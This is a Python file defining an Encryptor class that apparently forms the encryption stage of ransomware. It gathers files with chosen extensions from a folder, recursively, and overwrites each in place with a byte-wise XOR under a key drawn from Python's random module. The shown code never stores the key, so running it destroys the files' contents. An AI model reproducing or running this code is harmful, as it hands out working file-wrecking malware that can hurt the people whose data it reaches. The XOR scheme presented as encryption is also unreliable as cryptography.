"""
This file contains the Encryptor class, and every methods linked to the encryption process
"""
import random
import FileFunctions as Folder

class Encryptor():
    """
    This class allows you to encrypt data using a key
    Attributes :
    - encrypted_extension: tuple
    - files_to_encrypt: list
    - encryption_key: str
    - commputer_name: str
    - encryption_level: int
    - folder: str
    - recursive: bool
    """

    def __init__(
            self,
            encrypted_extensions: list,
            encryption_level: int,
            computer_name: str,
            folder: str,
            recursive: bool = True
        ) -> None:
        self.encrypted_extensions = encrypted_extensions
        self.encryption_level = encryption_level
        self.encryption_key = self.generate_encryption_key()
        self.computer_name = computer_name
        self.recursive = recursive

        # check if folder exists before setting it
        if Folder.folder_exists(folder):
            self.folder = folder
        else:
            exit("The selected folder was not found, check path and permissions.")

        self.files_to_encrypt = Folder.grab_files(self.folder, self.encrypted_extensions)
    
    def generate_encryption_key(self):
        """
        This function generates an encryption key
        """
        key = ''
        byte_list = ''
        for byte in range(0x00, 0xFF): # all 8 bit combination
            byte_list += (chr(byte))
        for _ in range(self.encryption_level):
            key += random.choice(byte_list)

        self.encryption_key = key
        return key
    
    def encrypt_files(self):
        """
        This function encrypts specified files
        """
        index = 0
        max_index = self.encryption_level - 1
        for file in self.files_to_encrypt:
            try:
                with open(file, 'rb') as reading_file: # Read file as binary
                    data = reading_file.read()
                with open(file, 'wb') as reading_file: # Read file as binary
                    for byte in data:
                        xor_byte = byte ^ ord(self.encryption_key[index]) # Encrypt any byte
                        reading_file.write(xor_byte.to_bytes(1, 'little')) # write file
                        if index >= max_index:
                            index = 0
                        else:
                            index += 1
            except Exception:
                print('Couldn\'t encrypt file \'' + file + '\'.')
        print('Files were encrypted successfully.\n')
